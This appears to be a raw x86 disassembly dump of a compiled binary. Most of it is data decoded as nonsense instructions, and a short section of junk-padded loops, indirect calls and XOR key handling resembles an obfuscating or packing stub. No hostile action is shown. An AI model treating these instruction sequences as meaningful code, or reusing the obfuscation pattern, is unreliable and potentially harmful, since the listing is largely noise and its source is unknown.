  40c486:	mov    eax,ds:0xb475578c
  40c48b:	mul    DWORD PTR [ecx]
  40c48d:	and    BYTE PTR [esi+0x55],al
  40c490:	std    
  40c491:	loopne 0x40c4dc
  40c493:	and    DWORD PTR [edx+0x28b75b28],esp
  40c499:	cdq    
  40c49a:	pop    edi
  40c49b:	inc    ecx
  40c49c:	sub    BYTE PTR [edx],ch
  40c49e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c49f:	setp   BYTE PTR [esi]
  40c4a2:	pop    edi
  40c4a3:	popa   
  40c4a4:	mov    gs,ebp
  40c4a6:	mov    ebx,0xe6cfd8f7
  40c4ab:	inc    esi
  40c4ac:	pop    esp
  40c4ad:	shr    BYTE PTR [ecx],1
  40c4af:	xor    BYTE PTR [ebp-0x1391fde5],bl
  40c4b5:	mov    edi,0x7db5226
  40c4ba:	aad    0x5
  40c4bc:	ins    DWORD PTR es:[edi],dx
  40c4bd:	mov    eax,0x335d558d
  40c4c2:	pop    ds
  40c4c3:	or     ebp,DWORD PTR [ebp-0x29]
  40c4c6:	test   BYTE PTR ds:0x55dd5552,ch
  40c4cc:	and    esp,DWORD PTR [ebx+0x64]
  40c4cf:	into   
  40c4d0:	ins    DWORD PTR es:[edi],dx
  40c4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d2:	fs dec esi
  40c4d4:	dec    esp
  40c4d5:	call   0xd403cbc7
  40c4da:	lods   eax,DWORD PTR ds:[esi]
  40c4db:	push   ecx
  40c4dc:	cmc    
  40c4dd:	pop    ebx
  40c4de:	mov    esp,0x2612c5d1
  40c4e3:	(bad)  
  40c4e4:	xchg   edi,eax
  40c4e5:	inc    eax
  40c4e6:	sub    bh,BYTE PTR [eax-0x1]
  40c4e9:	mov    eax,0x1957dbc
  40c4ee:	daa    
  40c4ef:	add    dl,BYTE PTR [esi]
  40c4f1:	rol    ecx,0x89
  40c4f4:	push   bp
  40c4f6:	pop    eax
  40c4f7:	xchg   DWORD PTR [esi],ebp
  40c4f9:	xor    edi,edx
  40c4fb:	out    0x43,al
  40c4fd:	sahf   
  40c4fe:	pop    ebp
  40c4ff:	adc    al,0x53
  40c501:	cdq    
  40c502:	fcom   QWORD PTR [edx+ebp*8]
  40c505:	jb     0x40c518
  40c507:	cmp    al,0x3a
  40c509:	jbe    0x40c4ab
  40c50b:	push   eax
  40c50c:	(bad)  
  40c50d:	jne    0x40c4b7
  40c50f:	pop    ebx
  40c510:	mov    cl,0x78
  40c512:	ror    DWORD PTR [ecx-0x44456454],1
  40c518:	das    
  40c519:	and    DWORD PTR [eax],0xfab0bc29
  40c51f:	(bad)  
  40c521:	push   es
  40c522:	clc    
  40c523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c524:	add    al,0x92
  40c526:	and    DWORD PTR [eax],eax
  40c528:	mov    cl,0x6f
  40c52a:	inc    edi
  40c52b:	push   eax
  40c52c:	imul   ebx,DWORD PTR [eax+0x26253178],0x16feeea4
  40c536:	push   es
  40c537:	cld    
  40c538:	sbb    DWORD PTR [ecx+0x5964233d],edi
  40c53e:	sbb    eax,0xe4e0eb48
  40c543:	push   esi
  40c544:	cmp    DWORD PTR [eax+0x7a54d9cb],esi
  40c54a:	ja     0x40c5c6
  40c54c:	test   al,0x61
  40c54e:	fbstp  TBYTE PTR [ecx-0x3b]
  40c551:	je     0x40c4f2
  40c553:	mov    al,0x67
  40c555:	dec    edi
  40c556:	or     esp,0x1e
  40c559:	xchg   DWORD PTR [ebp+edx*4-0x80],eax
  40c55d:	rol    BYTE PTR es:0x5535d126,1
  40c564:	or     BYTE PTR [ecx+0x7],dl
  40c567:	jmp    0x40c782
  40c56c:	jnp    0x40c5eb
  40c56e:	xchg   edi,eax
  40c56f:	les    edx,FWORD PTR [ecx+0x72c54b52]
  40c575:	sub    esi,DWORD PTR [eax-0xf]
  40c578:	pushf  
  40c579:	das    
  40c57a:	mov    esp,0x708771e9
  40c57f:	jo     0x40c5f3
  40c581:	jg     0x40c5f3
  40c583:	jo     0x40c521
  40c585:	std    
  40c586:	cmp    DWORD PTR [esi],0xffffffb2
  40c589:	cmp    DWORD PTR [esi+0x2080401f],eax
  40c58f:	and    BYTE PTR [esi+edx*2+0x7c],dh
  40c593:	jmp    0x40c604
  40c595:	mov    dh,0xc8
  40c597:	push   es
  40c598:	lahf   
  40c599:	call   0x72fc838b
  40c59e:	cmp    DWORD PTR ds:0x3d2a8ca8,ebx
  40c5a4:	mov    al,ds:0x924e5faf
  40c5a9:	inc    ecx
  40c5aa:	sbb    DWORD PTR [esi-0x3902dfc0],ebp
  40c5b0:	mov    BYTE PTR [ebx-0x218b32d],bh
  40c5b6:	xchg   esp,eax
  40c5b7:	add    BYTE PTR [edi-0x7d2bedbc],bl
  40c5bd:	inc    edi
  40c5be:	into   
  40c5bf:	pop    ds
  40c5c0:	(bad)  
  40c5c1:	ja     0x40c573
  40c5c3:	fstp   QWORD PTR [esi]
  40c5c5:	jae    0x40c63b
  40c5c7:	push   ebp
  40c5c8:	adc    BYTE PTR [eax-0x1c3dbbd6],0xc
  40c5cf:	sbb    ecx,eax
  40c5d1:	outs   dx,BYTE PTR ds:[esi]
  40c5d2:	or     eax,0xdb41edf3
  40c5d7:	jecxz  0x40c576
  40c5d9:	rcr    BYTE PTR [edx],1
  40c5db:	iret   
  40c5dc:	mov    eax,ds:0x2fc8ca86
  40c5e1:	mov    ch,0xff
  40c5e3:	inc    eax
  40c5e4:	pop    ebx
  40c5e5:	and    BYTE PTR [ebx+0x496c01c6],bl
  40c5eb:	xchg   esp,eax
  40c5ec:	pop    ecx
  40c5ed:	mov    al,ds:0xc39ae3ee
  40c5f2:	mov    ds:0xad0e4ec4,eax
  40c5f7:	cwde   
  40c5f8:	and    DWORD PTR [edx],0x8ef83af9
  40c5fe:	sahf   
  40c5ff:	inc    ebx
  40c600:	cwde   
  40c601:	call   0xbd0:0xe29a1da1
  40c608:	out    0xb9,eax
  40c60a:	xlat   BYTE PTR ds:[ebx]
  40c60b:	and    DWORD PTR [esp+eiz*8-0x68d374be],edx
  40c612:	scas   eax,DWORD PTR es:[edi]
  40c613:	and    al,0x75
  40c615:	ror    di,cl
  40c618:	adc    BYTE PTR [ebx-0x4d],0x52
  40c61c:	bound  ebp,QWORD PTR [ebx+esi*2-0xf]
  40c620:	fucom  st(0)
  40c622:	test   BYTE PTR [esi-0x7],0x2e
  40c626:	xchg   ebx,eax
  40c627:	imul   ebx,edi,0xffffffc1
  40c62a:	mov    cl,0xf7
  40c62c:	aad    0x13
  40c62e:	ror    BYTE PTR [ebx-0xf7c1222],cl
  40c634:	outs   dx,DWORD PTR ds:[esi]
  40c635:	add    BYTE PTR [edx],bh
  40c637:	arpl   WORD PTR [esi+0x1c],sp
  40c63a:	outs   dx,DWORD PTR ds:[esi]
  40c63b:	test   BYTE PTR [ebp+0x4a24cefa],bl
  40c641:	stc    
  40c642:	inc    esp
  40c643:	fnstcw WORD PTR [edi+ebp*2-0x70]
  40c647:	fmulp  st(6),st
  40c649:	(bad)
  40c64c:	pop    es
  40c64d:	and    al,0x81
  40c64f:	nop
  40c650:	inc    BYTE PTR [eax+0x4e]
  40c653:	hlt    
  40c654:	adc    DWORD PTR [eax+0x5],esp
  40c657:	enter  0x6241,0x31
  40c65b:	jne    0x40c664
  40c65d:	sbb    ah,dl
  40c65f:	stos   DWORD PTR es:[edi],eax
  40c660:	lods   al,BYTE PTR ds:[esi]
  40c661:	mov    edx,0x3a6af3d0
  40c666:	adc    DWORD PTR [ecx],0x61
  40c669:	push   ss
  40c66a:	pop    edi
  40c66b:	xchg   ecx,eax
  40c66c:	push   ecx
  40c66d:	mov    dl,0x1
  40c66f:	leave  
  40c670:	mov    dh,ah
  40c672:	clc    
  40c673:	retf   
  40c674:	in     al,0x9a
  40c676:	or     BYTE PTR [edi-0x40829d77],0xec
  40c67d:	icebp  
  40c67e:	cwde   
  40c67f:	jecxz  0x40c67a
  40c681:	retf   0xede2
  40c684:	xchg   ebp,eax
  40c685:	test   al,0xb1
  40c687:	(bad)  
  40c688:	jns    0x40c687
  40c68a:	call   0x438d520
  40c68f:	ja     0x40c697
  40c691:	int    0x8e
  40c693:	mov    ebx,0x9d6991b6
  40c698:	adc    al,0x78
  40c69a:	mov    bl,0x38
  40c69c:	dec    edx
  40c69d:	arpl   WORD PTR [eax-0x58],dx
  40c6a0:	loopne 0x40c6f2
  40c6a2:	sbb    eax,0xae6fda55
  40c6a7:	clc    
  40c6a8:	sbb    DWORD PTR [ebp-0x5],esp
  40c6ab:	push   0x20
  40c6ad:	dec    ebp
  40c6ae:	cmp    eax,0x11631d74
  40c6b3:	push   cs
  40c6b4:	mov    al,0xaf
  40c6b6:	icebp  
  40c6b7:	aaa    
  40c6b8:	lods   eax,DWORD PTR ds:[esi]
  40c6b9:	push   ebp
  40c6ba:	aad    0x1e
  40c6bc:	and    al,0xc3
  40c6be:	int    0xc3
  40c6c0:	in     al,dx
  40c6c1:	add    BYTE PTR [edx+ebx*4],bl
  40c6c4:	pop    ebp
  40c6c5:	cvttps2pi mm7,QWORD PTR [ecx-0x60ed75ac]
  40c6cc:	cmc    
  40c6cd:	inc    esi
  40c6ce:	pop    ss
  40c6cf:	and    al,0x6d
  40c6d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6d2:	call   FWORD PTR [eax+0x3d]
  40c6d5:	mov    DWORD PTR [ecx+0x26695d19],edi
  40c6db:	jb     0x40c71d
  40c6dd:	sub    ebx,DWORD PTR [ebp-0x55]
  40c6e0:	(bad)  
  40c6e1:	int3   
  40c6e2:	push   es
  40c6e3:	sbb    ecx,DWORD PTR [eax+0x4ef7b9e9]
  40c6e9:	mov    ch,0x5f
  40c6eb:	mov    dl,0xba
  40c6ed:	jo     0x40c764
  40c6ef:	icebp  
  40c6f0:	retf   
  40c6f1:	cdq    
  40c6f2:	loop   0x40c71c
  40c6f4:	dec    ecx
  40c6f5:	(bad)  
  40c6f6:	cli    
  40c6f7:	and    eax,0xdf624768
  40c6fc:	lods   al,BYTE PTR ds:[esi]
  40c6fd:	int3   
  40c6fe:	mov    ?,WORD PTR [ecx]
  40c700:	mov    bl,0x35
  40c702:	add    BYTE PTR [esp+ebx*4],dh
  40c705:	push   esi
  40c706:	sbb    bh,BYTE PTR [edx+0x2f1c2c24]
  40c70c:	or     eax,0xb42c34bd
  40c711:	popf   
  40c712:	outs   dx,BYTE PTR ds:[esi]
  40c713:	daa    
  40c714:	push   ss
  40c715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c716:	mov    eax,0xcf472bd3
  40c71b:	lods   al,BYTE PTR ds:[esi]
  40c71c:	and    al,0x4
  40c71e:	inc    eax
  40c71f:	mov    edx,0x6c19fa26
  40c724:	ret    0x7e0e
  40c727:	xchg   esi,eax
  40c728:	inc    esi
  40c729:	push   ebp
  40c72a:	das    
  40c72b:	(bad)  
  40c72c:	xchg   edx,eax
  40c72d:	sti    
  40c72e:	pop    esi
  40c72f:	jo     0x40c780
  40c731:	xchg   BYTE PTR [edi+0x33],ah
  40c734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c736:	lods   al,BYTE PTR ds:[esi]
  40c737:	mov    bl,0xde
  40c739:	sbb    eax,0x9e333ca5
  40c73e:	cmp    al,0xc8
  40c740:	pop    ds
  40c741:	int3   
  40c742:	sbb    edi,DWORD PTR [ebp+0x618fc061]
  40c748:	neg    DWORD PTR [eax]
  40c74a:	scas   al,BYTE PTR es:[edi]
  40c74b:	fcomp  QWORD PTR [eax-0x65]
  40c74e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c74f:	(bad)  [ecx]
  40c751:	out    0x80,eax
  40c753:	ins    BYTE PTR es:[edi],dx
  40c754:	push   eax
  40c755:	jbe    0x40c75a
  40c757:	cmp    ecx,DWORD PTR [eax]
  40c759:	lock push eax
  40c75b:	idiv   ch
  40c75d:	std    
  40c75e:	mov    DWORD PTR [edx-0x56],esi
  40c761:	ds call 0xecb9153c
  40c767:	adc    eax,0x30b1e1ed
  40c76c:	mov    ch,0x6e
  40c76e:	mov    DWORD PTR [esi-0x7f6e77dc],ecx
  40c774:	jmp    0x9b35:0x152589b8
  40c77b:	outs   dx,BYTE PTR ds:[esi]
  40c77c:	out    dx,al
  40c77d:	jb     0x40c727
  40c77f:	sti    
  40c780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c781:	or     eax,0x32729c05
  40c786:	add    cl,cl
  40c788:	ret    0x4
  40c78b:	push   ebp
  40c78c:	mov    ebp,esp
  40c78e:	mov    eax,ds:0x416224
  40c793:	mov    edx,0x32729c
  40c798:	and    DWORD PTR ds:0x434372,edi
  40c79e:	sub    eax,edx
  40c7a0:	and    DWORD PTR ds:0x432700,0x0
  40c7aa:	jmp    0x40c7bc
  40c7af:	mov    ecx,DWORD PTR ds:0x432700
  40c7b5:	inc    ecx
  40c7b6:	mov    DWORD PTR ds:0x432700,ecx
  40c7bc:	cmp    DWORD PTR ds:0x432700,0x1c
  40c7c3:	jae    0x40c8aa
  40c7c9:	cmp    DWORD PTR ds:0x432700,0x21
  40c7d0:	jne    0x40c7e4
  40c7d6:	push   0x432dc2
  40c7db:	push   DWORD PTR [ebp-0x1c]
  40c7de:	call   DWORD PTR ds:0x432d1e
  40c7e4:	jmp    0x40c7af
  40c7e9:	and    DWORD PTR ds:0x434386,0x0
  40c7f3:	jmp    0x40c805
  40c7f8:	mov    ecx,DWORD PTR ds:0x434386
  40c7fe:	inc    ecx
  40c7ff:	mov    DWORD PTR ds:0x434386,ecx
  40c805:	cmp    DWORD PTR ds:0x434386,0x1a
  40c80c:	jae    0x40c8aa
  40c812:	cmp    DWORD PTR ds:0x434386,0x9
  40c819:	jne    0x40c82d
  40c81f:	push   0x43441d
  40c824:	push   DWORD PTR [ebp-0x24]
  40c827:	call   DWORD PTR ds:0x4329ea
  40c82d:	cmp    DWORD PTR ds:0x434386,0x8
  40c834:	jne    0x40c847
  40c83a:	mov    ecx,DWORD PTR ds:0x434386
  40c840:	inc    ecx
  40c841:	mov    DWORD PTR ds:0x434386,ecx
  40c847:	jmp    0x40c7f8
  40c84c:	mov    DWORD PTR ds:0x4343a2,0x1c
  40c856:	cmp    DWORD PTR ds:0x4343a2,0x0
  40c85d:	je     0x40c8aa
  40c863:	cmp    DWORD PTR ds:0x4343a2,0xf
  40c86a:	jne    0x40c87c
  40c870:	push   DWORD PTR [ebp-0x14]
  40c873:	push   DWORD PTR [ebp-0x20]
  40c876:	call   DWORD PTR ds:0x432c66
  40c87c:	cmp    DWORD PTR ds:0x4343a2,0x10
  40c883:	jne    0x40c898
  40c889:	xor    ecx,ecx
  40c88b:	xor    ecx,DWORD PTR ds:0x4343a2
  40c891:	dec    ecx
  40c892:	mov    DWORD PTR ds:0x4343a2,ecx
  40c898:	mov    ecx,DWORD PTR ds:0x4343a2
  40c89e:	dec    ecx
  40c89f:	mov    DWORD PTR ds:0x4343a2,ecx
  40c8a5:	jmp    0x40c856
  40c8aa:	mov    ecx,0x7510855
  40c8af:	push   esi
  40c8b0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8b3:	xor    eax,ecx
  40c8b5:	cmp    eax,esi
  40c8b7:	je     0x40d05a
  40c8bd:	mov    eax,ds:0x41621c
  40c8c2:	mov    esi,DWORD PTR [ebp+0xc]
  40c8c5:	sub    eax,edx
  40c8c7:	xor    eax,ecx
  40c8c9:	jmp    0x40cb3d
  40c8ce:	xchg   edi,eax
  40c8cf:	rol    DWORD PTR ds:0xb5744198,1
  40c8d5:	icebp  
  40c8d6:	lods   al,BYTE PTR ds:[esi]
  40c8d7:	add    al,0x98
  40c8d9:	rcl    DWORD PTR [ebx+0x7385aec4],0x85
  40c8e0:	jo     0x40c952
  40c8e2:	leave  
  40c8e3:	jle    0x40c955
  40c8e5:	jo     0x40c8ec
  40c8e7:	mov    ah,0xdb
  40c8e9:	and    al,bl
  40c8eb:	loopne 0x40c8f8
  40c8ed:	in     eax,0xa6
  40c8ef:	mov    ecx,DWORD PTR [edx]
  40c8f1:	xchg   edx,eax
  40c8f2:	in     eax,dx
  40c8f3:	mov    ah,0x6c
  40c8f5:	bound  ebp,QWORD PTR [esi]
  40c8f7:	iret   
  40c8f8:	int    0x9b
  40c8fa:	add    DWORD PTR [edx+0x58],eax
  40c8fd:	mov    ecx,0x8ff6f07
  40c902:	gs dec edi
  40c904:	inc    edi
  40c905:	je     0x40c8f1
  40c907:	in     eax,dx
  40c908:	fimul  WORD PTR [ebx-0x47629bf8]
  40c90e:	out    dx,eax
  40c90f:	dec    eax
  40c910:	shl    BYTE PTR [ebx-0x27],cl
  40c913:	dec    ebp
  40c914:	xor    BYTE PTR [eax+edx*2-0x6c],cl
  40c918:	xor    DWORD PTR [edx-0x76b65f20],0xa5f75fbe
  40c922:	jge    0x40c992
  40c924:	push   edx
  40c925:	inc    ebx
  40c926:	lea    edx,[eax]
  40c928:	add    BYTE PTR [ebx+0x18],dh
  40c92b:	push   eax
  40c92c:	adc    eax,0xb6215fff
  40c931:	jno    0x40c960
  40c933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c934:	dec    edx
  40c935:	xor    edi,DWORD PTR [ecx-0x1f]
  40c938:	ret    
  40c939:	mov    bh,0xa7
  40c93b:	jge    0x40c926
  40c93d:	mov    ds:0x1a5dc9b3,al
  40c942:	mov    ch,0x4d
  40c944:	or     BYTE PTR fs:[edi+0x34322680],cl
  40c94b:	or     al,0x33
  40c94d:	adc    DWORD PTR [edx+0x5c],ebx
  40c950:	leave  
  40c951:	fs call 0x554d:0x7343d0bd
  40c959:	cwde   
  40c95a:	inc    esp
  40c95b:	dec    edx
  40c95c:	mov    esp,0xd6766c93
  40c961:	cs dec ecx
  40c963:	into   
  40c964:	mov    ss,WORD PTR [ecx-0x316cacf0]
  40c96a:	mov    ds:0xe34b0057,eax
  40c96f:	sbb    ch,BYTE PTR [edi]
  40c971:	inc    esp
  40c972:	lock jns 0x40c9e1
  40c975:	xchg   edx,eax
  40c976:	loope  0x40c98c
  40c978:	jb     0x40c994
  40c97a:	sub    bl,BYTE PTR [eax+0x1b]
  40c97d:	sahf   
  40c97e:	adc    esp,eax
  40c980:	sub    eax,0xaf8931f0
  40c985:	aas    
  40c986:	fcmovnu st,st(7)
  40c988:	leave  
  40c989:	or     edx,DWORD PTR [ebx+0x1e]
  40c98c:	mov    ah,0x4d
  40c98e:	xor    edi,DWORD PTR [edx-0x5d]
  40c991:	mov    ch,0x1e
  40c993:	jg     0x40c926
  40c995:	pop    es
  40c996:	daa    
  40c997:	ret    
  40c998:	pop    edx
  40c999:	jl     0x40c9c1
  40c99b:	fnstcw WORD PTR [edx+edx*2-0x10]
  40c99f:	fadd   DWORD PTR [eax]
  40c9a1:	in     eax,0x7e
  40c9a3:	mov    WORD PTR [eax+ebx*4+0x35],?
  40c9a7:	dec    ebp
  40c9a8:	or     eax,0xea9c7106
  40c9ad:	jmp    0xd842:0x60a57591
  40c9b4:	mov    ds:0x8babd2c2,eax
  40c9b9:	aad    0x8
  40c9bb:	mov    ebx,0x63a5107f
  40c9c0:	sub    al,0xd9
  40c9c2:	jno    0x40ca2e
  40c9c4:	adc    dh,BYTE PTR [ecx]
  40c9c6:	out    0xe0,al
  40c9c8:	sbb    eax,DWORD PTR [ecx+0xc]
  40c9cb:	add    al,0xa4
  40c9cd:	(bad)  
  40c9ce:	fbstp  TBYTE PTR [edx-0x6958e613]
  40c9d4:	cmp    al,0xce
  40c9d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9d7:	hlt    
  40c9d8:	icebp  
  40c9d9:	and    al,0x68
  40c9db:	icebp  
  40c9dc:	loopne 0x40ca38
  40c9de:	cmp    dh,ch
  40c9e0:	mov    edx,0x81cc3592
  40c9e5:	cmp    DWORD PTR [ebp+0x4207a18b],ecx
  40c9eb:	(bad)  
  40c9ec:	(bad)  
  40c9ed:	inc    ebx
  40c9ee:	cs scas al,BYTE PTR es:[edi]
  40c9f0:	inc    ecx
  40c9f1:	cdq    
  40c9f2:	lock sbb eax,0xbaa8e4b3
  40c9f8:	xchg   DWORD PTR [esi],ebx
  40c9fa:	sub    bh,BYTE PTR [ebp-0x544bde57]
  40ca00:	out    dx,eax
  40ca01:	call   0xa9db4559
  40ca06:	dec    esp
  40ca07:	mov    edx,0x748a2f47
  40ca0c:	mov    eax,0xf4d20fca
  40ca11:	mov    cl,0x9b
  40ca13:	pop    ebp
  40ca14:	xchg   DWORD PTR [esi-0x70582504],esi
  40ca1a:	push   cs
  40ca1b:	xabort 0x6d
  40ca1e:	cwde   
  40ca1f:	cmp    DWORD PTR [eax-0x517dd145],0x2ded1d07
  40ca29:	fdiv   DWORD PTR [ebx*4+0x4248f578]
  40ca30:	and    al,0x56
  40ca32:	mov    BYTE PTR [ecx+0x21755826],dl
  40ca38:	mov    edx,0x3b6d5468
  40ca3d:	jbe    0x40c9f2
  40ca3f:	das    
  40ca40:	inc    ecx
  40ca41:	js     0x40ca0e
  40ca43:	cld    
  40ca44:	xchg   ebx,eax
  40ca45:	repz cmp BYTE PTR [edx],cl
  40ca48:	jg     0x40c9db
  40ca4a:	dec    eax
  40ca4b:	mov    cs,WORD PTR [edi+ebp*4+0x3de06c02]
  40ca52:	shl    DWORD PTR [ecx*1-0x28a00c2e],1
  40ca59:	sub    esp,edx
  40ca5b:	enter  0x1791,0xea
  40ca5f:	dec    ecx
  40ca60:	sahf   
  40ca61:	loope  0x40c9fe
  40ca63:	inc    edi
  40ca64:	(bad)  
  40ca65:	mov    ebp,DWORD PTR [ebp+0x5d396c40]
  40ca6b:	test   BYTE PTR [ebx-0x3b],dh
  40ca6e:	xor    BYTE PTR [edi-0x7a],0x42
  40ca72:	mov    ecx,ds
  40ca74:	push   es
  40ca75:	lahf   
  40ca76:	mov    BYTE PTR [eax-0xa],ch
  40ca79:	out    0x2f,al
  40ca7b:	inc    eax
  40ca7c:	cmc    
  40ca7d:	pop    ebx
  40ca7e:	jp     0x40cac2
  40ca80:	stos   BYTE PTR es:[edi],al
  40ca81:	cwde   
  40ca82:	cmp    ebx,DWORD PTR cs:[ecx+0x15278e01]
  40ca89:	daa    
  40ca8a:	adc    BYTE PTR [eax],dl
  40ca8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca8d:	jnp    0x40ca62
  40ca8f:	or     al,0x4c
  40ca91:	and    eax,0x63e505c8
  40ca96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca97:	retf   0x2c93
  40ca9a:	inc    esi
  40ca9b:	or     ebp,edi
  40ca9d:	lods   eax,DWORD PTR ds:[esi]
  40ca9e:	push   ss
  40ca9f:	(bad)  
  40caa0:	out    dx,al
  40caa1:	add    eax,0x5106b4ac
  40caa6:	add    eax,0x6098eebe
  40caab:	jnp    0x40caf0
  40caad:	shr    DWORD PTR [edx+0x5be61af5],cl
  40cab3:	mov    edx,0xe7025e2
  40cab8:	bound  sp,DWORD PTR [ecx-0x4c]
  40cabc:	loopne 0x40ca62
  40cabe:	or     ebp,DWORD PTR [esi]
  40cac0:	clc    
  40cac1:	icebp  
  40cac2:	in     al,dx
  40cac3:	fld    DWORD PTR ds:0xd0f2a15d
  40cac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caca:	or     DWORD PTR [esi-0x73e536ff],esi
  40cad0:	sub    eax,DWORD PTR [ecx+0x7b44191b]
  40cad6:	shl    edi,1
  40cad8:	sahf   
  40cad9:	jbe    0x40cad4
  40cadb:	sti    
  40cadc:	loope  0x40cb5b
  40cade:	imul   ecx,DWORD PTR [eax],0x5bf31de5
  40cae4:	pop    edi
  40cae5:	inc    esi
  40cae6:	(bad)  
  40cae7:	mov    dh,0x35
  40cae9:	or     cl,bh
  40caeb:	das    
  40caec:	fadd   QWORD PTR [ecx]
  40caee:	enter  0x804d,0xb8
  40caf2:	(bad)  
  40caf4:	and    bh,BYTE PTR [ebx]
  40caf6:	fwait
  40caf7:	jo     0x40cae0
  40caf9:	mov    dl,0xa6
  40cafb:	outs   dx,BYTE PTR ds:[esi]
  40cafc:	xadd   BYTE PTR [esi-0x37],ah
  40cb00:	test   al,0x86
  40cb02:	imul   esi,DWORD PTR [di+0x5ac1],0xa76ffb45
  40cb0b:	and    eax,0xedcb7bd2
  40cb10:	jmp    0xdf48:0x887a8806
  40cb17:	daa    
  40cb18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb19:	cmp    DWORD PTR [ebp+0x66],eax
  40cb1c:	mov    ecx,ds
  40cb1e:	fsubr  DWORD PTR [edx-0x1e17aee2]
  40cb24:	addr16 add al,0x46
  40cb27:	loop   0x40caca
  40cb29:	ds pop ebp
  40cb2b:	mov    bh,ch
  40cb2d:	shl    cl,0xd5
  40cb30:	in     al,0x0
  40cb32:	push   0x58c7a381
  40cb37:	mov    al,ds:0x21a63422
  40cb3c:	inc    edi
  40cb3d:	cmp    eax,esi
  40cb3f:	jne    0x40cb55
  40cb45:	mov    eax,ds:0x416224
  40cb4a:	add    eax,DWORD PTR ds:0x41621c
  40cb50:	jmp    0x40d044
  40cb55:	mov    eax,DWORD PTR [ebp+0xc]
  40cb58:	xor    eax,ecx
  40cb5a:	jmp    0x40cdce
  40cb5f:	pop    ecx
  40cb60:	scas   al,BYTE PTR es:[edi]
  40cb61:	sbb    BYTE PTR [ebx-0xd],al
  40cb64:	push   ecx
  40cb65:	pop    ecx
  40cb66:	mov    dh,0xd4
  40cb68:	(bad)
  40cb6b:	dec    edx
  40cb6c:	xor    ebp,DWORD PTR [edx+0x23]
  40cb6f:	int3   
  40cb70:	xor    BYTE PTR [eax+0x70],0xc9
  40cb74:	jle    0x40cbe6
  40cb76:	jo     0x40cb6d
  40cb78:	jmp    DWORD PTR ss:[edx-0x4b3c1adf]
  40cb7f:	push   esp
  40cb80:	pop    edx
  40cb81:	xchg   esp,eax
  40cb82:	add    eax,DWORD PTR [ebx-0x39598aba]
  40cb88:	inc    edx
  40cb89:	mov    eax,0xb180e3ad
  40cb8e:	adc    ecx,DWORD PTR ds:0x6c1dcbd1
  40cb94:	(bad)  
  40cb95:	out    dx,eax
  40cb96:	stos   DWORD PTR es:[edi],eax
  40cb97:	add    al,0x38
  40cb99:	es sub eax,0x1dabbb28
  40cb9f:	jne    0x40cb7e
  40cba1:	fdivr  QWORD PTR [ecx+esi*2+0x52]
  40cba5:	push   0x4b723bbd
  40cbaa:	lods   al,BYTE PTR ds:[esi]
  40cbab:	rol    BYTE PTR [ecx-0x3aae3752],1
  40cbb1:	mov    dl,0xb7
  40cbb3:	dec    ebx
  40cbb4:	cmp    BYTE PTR [ecx],dh
  40cbb6:	out    dx,eax
  40cbb7:	je     0x40cb41
  40cbb9:	lahf   
  40cbba:	mov    ds:0xb7f51ae3,al
  40cbbf:	mov    DWORD PTR [esi],eax
  40cbc1:	inc    eax
  40cbc2:	sysenter 
  40cbc4:	push   edi
  40cbc5:	dec    esp
  40cbc6:	cmp    cl,BYTE PTR fs:[edx]
  40cbc9:	xor    BYTE PTR [edi+0x41],dh
  40cbcc:	retf   0xd0d7
  40cbcf:	mov    ecx,0x7c9406b7
  40cbd4:	mov    ebp,0x6d413c50
  40cbd9:	in     eax,0xa6
  40cbdb:	mov    edi,0x69ecb175
  40cbe0:	or     edx,DWORD PTR [edx+0x55]
  40cbe3:	jns    0x40cb98
  40cbe5:	adc    DWORD PTR [esi+0x3c],0x7527ca76
  40cbec:	mov    ah,0xb3
  40cbef:	shl    DWORD PTR [eax],1
  40cbf1:	clc    
  40cbf2:	mov    esi,0x4e59264c
  40cbf7:	inc    ecx
  40cbf8:	mov    ebx,0x718bcfd1
  40cbfd:	es cdq 
  40cbff:	inc    eax
  40cc00:	pop    esi
  40cc01:	push   es
  40cc02:	and    al,0x35
  40cc04:	pusha  
  40cc05:	repnz test BYTE PTR [ebx-0x1b81496e],dh
  40cc0c:	mov    DWORD PTR [ecx],eax
  40cc0e:	inc    esi
  40cc0f:	jmp    0x40cbcd
  40cc11:	les    esp,FWORD PTR [esi+edi*1-0x6b]
  40cc15:	mov    ch,0xfc
  40cc17:	push   esp
  40cc18:	push   edi
  40cc19:	in     al,dx
  40cc1a:	pop    esp
  40cc1b:	mov    edi,0xf0854e35
  40cc20:	cmp    eax,ebx
  40cc22:	jno    0x40cc3f
  40cc24:	sub    edi,edi
  40cc26:	ss (bad) 
  40cc28:	out    dx,eax
  40cc29:	mov    ebx,0x3a8fbf92
  40cc2e:	ret    0xf87e
  40cc31:	or     bh,dl
  40cc33:	sbb    BYTE PTR [ecx+eiz*4],dl
  40cc36:	adc    esp,DWORD PTR [ecx-0x302a0f27]
  40cc3c:	cmp    DWORD PTR [edi-0x78],0x13
  40cc40:	sub    bl,ah
  40cc42:	dec    eax
  40cc43:	jge    0x40cbdc
  40cc45:	jmp    0x40cc02
  40cc47:	mov    ah,0x81
  40cc49:	pop    es
  40cc4a:	push   cs
  40cc4b:	repnz or eax,0xa77a288f
  40cc51:	add    DWORD PTR [ebx*8+0x63afde43],esi
  40cc58:	test   al,0x77
  40cc5a:	xchg   DWORD PTR [esi-0x4c],ebx
  40cc5d:	mov    cl,0xfd
  40cc5f:	mov    dl,BYTE PTR ds:0x8fbe532f
  40cc65:	add    bh,BYTE PTR [edi]
  40cc67:	ss cmp ah,BYTE PTR es:[esi-0x6e]
  40cc6c:	imul   edx,DWORD PTR [eax-0x18],0x7d9b60bc
  40cc73:	out    dx,eax
